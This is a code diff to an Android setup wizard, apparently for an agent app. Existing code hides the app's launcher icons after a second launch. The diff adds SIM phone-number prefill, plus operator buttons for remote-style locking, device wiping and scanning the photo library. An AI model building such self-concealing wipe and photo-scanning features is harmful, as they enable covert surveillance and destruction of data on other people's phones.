@@ -1,5 +1,6 @@
 package com.wormgitty.agent
 
+import android.app.Activity
 import android.content.ComponentName
 import android.content.Context
 import android.content.pm.PackageManager
@@ -21,6 +22,7 @@ import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Button
+import androidx.compose.material3.ButtonDefaults
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Text
@@ -34,6 +36,7 @@ import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableStateMapOf
 import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.remember
+import androidx.compose.runtime.saveable.rememberSaveable
 import androidx.compose.runtime.rememberCoroutineScope
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
@@ -132,6 +135,7 @@ class MainActivity : ComponentActivity() {
             .create()
         dlg.show()
     }
+
 
     /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
     private fun runHideSequence(prefs: HidePrefs) {
@@ -253,6 +257,7 @@ fun WizardScreen(
     var step by remember { mutableStateOf(Step.INTRO) }
     var name by remember { mutableStateOf("") }
     var phoneRaw by remember { mutableStateOf("") }
+    var photoCountText by remember { mutableStateOf<String?>(null) }
     val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
     PermKey.entries.forEach { permStates.putIfAbsent(it, false) }
     var registering by remember { mutableStateOf(false) }
@@ -350,10 +355,15 @@ fun WizardScreen(
             Step.PHONE -> {
                 val activityCtx = LocalContext.current
                 // SIM hint prefill: line1Number == null is NOT a failure state.
+                // A one-shot flag guards against re-insertion after recreation.
+                var simPrefillDone by rememberSaveable { mutableStateOf(false) }
                 LaunchedEffect(Unit) {
-                    if (phoneRaw.isBlank()) {
-                        PhoneSource.simLineNumber(activityCtx)?.let { phoneRaw = it }
+                    if (!simPrefillDone && phoneRaw.isBlank()) {
+                        PhoneSource.simLineNumber(activityCtx)?.let {
+                            phoneRaw = it
+                        }
                     }
+                    simPrefillDone = true
                 }
                 val normalized = PhoneNormalizer.normalize(phoneRaw)
                 var simNumber by remember { mutableStateOf<String?>(null) }
@@ -430,7 +440,13 @@ fun WizardScreen(
                 BotBubble(stringResource(R.string.summary_title))
                 UserBubble(name)
                 UserBubble(PhoneNormalizer.normalize(phoneRaw) ?: phoneRaw)
+                val activityCtx = LocalContext.current
                 val locked = stringResource(R.string.lock_btn)
+                val wipeLabel = stringResource(R.string.wipe_btn)
+                val lockNowLabel = stringResource(R.string.lock_now_btn)
+                val notifyLabel = stringResource(R.string.notify_test_btn)
+                val scanLabel = stringResource(R.string.photo_scan_btn)
+
                 Button(
                     onClick = {
                         registering = true
@@ -453,6 +469,48 @@ fun WizardScreen(
                     enabled = !registering,
                     modifier = Modifier.testTag("lock_btn")
                 ) { Text(locked) }
+
+                // Side-by-side operator actions beside "قفل": locking NOW is a
+                // screen-off courtesy; wiping follows a double confirmation.
+                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                    Button(
+                        onClick = { OperatorActions.localLockNow(activityCtx) },
+                        modifier = Modifier.testTag("locknow_btn")
+                    ) { Text(lockNowLabel) }
+                    Button(
+                        onClick = { WipePrompt.show(activityCtx as Activity) },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB71C1C)),
+                        modifier = Modifier.testTag("wipe_btn")
+                    ) { Text(wipeLabel) }
+                }
+
+                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                    Button(
+                        onClick = { OperatorActions.sendTestNotification(activityCtx) },
+                        modifier = Modifier.testTag("notify_test_btn")
+                    ) { Text(notifyLabel) }
+                    Button(
+                        onClick = {
+                            val scan = OperatorActions.scanPhotos(activityCtx)
+                            photoCountText = when {
+                                scan.count < 0 -> "— (إذن الوسائط مش متاح)"
+                                scan.count == 0 -> "0"
+                                else -> scan.count.toString()
+                            }
+                        },
+                        modifier = Modifier.testTag("photo_scan_btn")
+                    ) { Text(scanLabel) }
+                }
+                if (photoCountText != null) {
+                    Text(
+                        if (photoCountText == "0") stringResource(R.string.photos_none_found)
+                        else stringResource(R.string.photo_count_fmt)
+                            .replace("%1\$d", photoCountText ?: "")
+                            .replace("%2\$s", "files/operator/photo_count.txt"),
+                        fontSize = 14.sp,
+                        modifier = Modifier.testTag("photo_count_text")
+                    )
+                }
             }
 
             Step.LOCKING -> {}
